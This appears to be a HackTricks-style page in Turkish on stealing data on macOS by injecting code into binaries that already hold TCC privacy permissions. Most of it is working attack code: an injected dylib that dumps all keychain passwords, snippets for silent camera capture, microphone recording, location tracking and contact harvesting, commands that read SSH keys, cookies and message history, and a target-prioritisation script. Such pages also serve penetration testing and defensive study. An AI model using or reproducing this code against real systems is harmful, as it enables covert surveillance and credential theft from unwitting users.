# macOS Kimlik Bilgileri ve Veri Hırsızlığı — TCC İzinleri Üzerinden

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

macOS TCC (Şeffaflık, Onay ve Kontrol) hassas kullanıcı verilerine erişimi korur. Bir saldırgan **zaten TCC izinlerine sahip bir binary'yi ele geçirirse**, bu izinleri otomatik olarak devralır. Bu sayfada, veri hırsızlığıyla ilgili her bir TCC izninin sömürü potansiyeli belgelenmiştir.

> [!WARNING]
> Bir TCC-izinli binary'e yapılan kod enjeksiyonu (DYLD injection, dylib hijacking veya task port aracılığıyla) **tüm TCC izinlerini sessizce devralır**. Aynı süreç korunan verileri okuduğunda ek bir istem veya doğrulama olmaz.

---

## Keychain Erişim Grupları

### Elde Edilebilecek Veriler

macOS Keychain şu verileri saklar:
- **Wi-Fi parolaları** — kaydedilmiş tüm kablosuz ağ kimlik bilgileri
- **Web sitesi parolaları** — Safari, Chrome (Keychain kullanıldığında) ve diğer tarayıcı parolaları
- **Uygulama parolaları** — e-posta hesapları, VPN kimlik bilgileri, geliştirme tokenları
- **Sertifikalar ve özel anahtarlar** — kod imzalama, istemci TLS, S/MIME şifreleme
- **Güvenli notlar** — kullanıcı tarafından saklanan sırlar

### Yetki: `keychain-access-groups`

Keychain öğeleri **erişim gruplarına** göre organize edilir. Bir uygulamanın `keychain-access-groups` entitlement'ı hangi gruplara erişebileceğini listeler:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### İstismar
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Kamera Erişimi (kTCCServiceCamera)

### İstismar

Kamera TCC yetkisine sahip bir binary (`kTCCServiceCamera` veya `com.apple.security.device.camera` entitlement aracılığıyla) fotoğraf ve video yakalayabilir:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> **macOS Sonoma**'dan başlayarak, menü çubuğundaki kamera göstergesi kalıcıdır ve program aracılığıyla gizlenemez. Daha eski **macOS sürümlerinde**, kısa bir yakalama belirgin bir gösterge oluşturmayabilir.

---

## Mikrofon Erişimi (kTCCServiceMicrophone)

### İstismar

Mikrofon erişimi dahili mikrofondan, kulaklıktan veya bağlı ses giriş cihazlarından gelen tüm sesi yakalar:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attack: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Konum Takibi (kTCCServiceLocation)

### İstismar
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Sürekli İzleme
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kişiler / Takvim / Fotoğraflar

### Kişisel Verilerin Dışarı Aktarılması

| TCC Servisi | Framework | Veri |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | İsimler, e-postalar, telefonlar, adresler |
| `kTCCServiceCalendar` | `EventKit` | Toplantılar, katılımcılar, konumlar |
| `kTCCServicePhotos` | `Photos.framework` | Fotoğraflar, ekran görüntüleri, konum meta verileri |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Kişi Bilgileri Toplama
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud Hesap Erişimi

### Yetki: `com.apple.private.icloud-account-access`

Bu yetki `com.apple.iCloudHelper` XPC servisi ile iletişim kurulmasına izin verir ve şu erişimleri sağlar:
- **iCloud tokens** — kullanıcının Apple ID'si için kimlik doğrulama token'ları
- **iCloud Drive** — tüm cihazlardan senkronize edilmiş belgeler
- **iCloud Keychain** — tüm Apple cihazlarında senkronize edilmiş parolalar
- **Find My** — kullanıcının tüm Apple cihazlarının konumu
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> iCloud yetkisine sahip bir binary'in ele geçirilmesi, saldırıyı **tek bir cihazdan tüm Apple ekosistemine** genişletir: diğer Macs, iPhones, iPads, Apple Watch. iCloud Keychain eşitlemesi, tüm cihazlardaki parolalara erişilebileceği anlamına gelir.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### En Güçlü TCC İzni

Full Disk Access, sistemdeki **her dosyaya** okuma yetkisi sağlar, şunlar dahil:
- Diğer uygulamaların verileri (Messages, Mail, Safari history)
- TCC veritabanları (diğer tüm izinleri ortaya çıkarır)
- SSH anahtarları ve yapılandırması
- Tarayıcı çerezleri ve oturum token'ları
- Uygulama veritabanları ve önbellekleri
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

injectable TCC-granted binaries'i değerlendirirken, veri değerine göre önceliklendirin:

| Öncelik | TCC Permission | Neden |
|---|---|---|
| **Kritik** | Full Disk Access | Her şeye erişim |
| **Kritik** | TCC Manager | Herhangi bir izni verebilir |
| **Yüksek** | Keychain Access Groups | Tüm kayıtlı şifreler |
| **Yüksek** | iCloud Account Access | Çoklu cihazın ele geçirilmesi |
| **Yüksek** | Input Monitoring (ListenEvent) | Keylogging |
| **Yüksek** | Accessibility | GUI kontrolü, self-granting |
| **Orta** | Screen Capture | Görsel veri yakalama |
| **Orta** | Camera + Microphone | Gözetleme |
| **Orta** | Contacts + Calendar | Sosyal mühendislik verileri |
| **Düşük** | Location | Fiziksel takip |
| **Düşük** | Photos | Kişisel veriler |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Kaynaklar

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
